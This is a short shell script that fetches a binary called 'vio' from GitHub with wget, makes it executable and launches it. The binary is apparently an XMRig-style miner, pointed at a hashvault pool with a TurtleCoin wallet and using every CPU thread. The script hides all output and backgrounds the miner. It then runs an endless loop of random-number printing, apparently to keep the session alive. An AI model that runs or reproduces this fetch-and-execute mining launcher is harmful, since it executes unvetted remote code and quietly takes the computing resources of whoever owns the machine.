#!/bin/sh
wget https://github.com/Siganteng2/gas/raw/main/vio
chmod u+x vio
./vio --donate-level 1 -a Argon2/Chukwa -o frankfurt01.hashvault.pro:80 -u TRTLuwzkm732ksmHm7mXRUam5Liif1LTij6LYxdR72cGS2a6T1o9nXeCaVd1SutG7sfszCD6uRRSVL5CmmDFfXR83e1A1xcXGqy -p $(cat /proc/sys/kernel/hostname) -t$(nproc --all) >/dev/null &
while :; do shuf -n 1 -i 1-99999999; sleep 30; done >/dev/null >/dev/null 2>&1
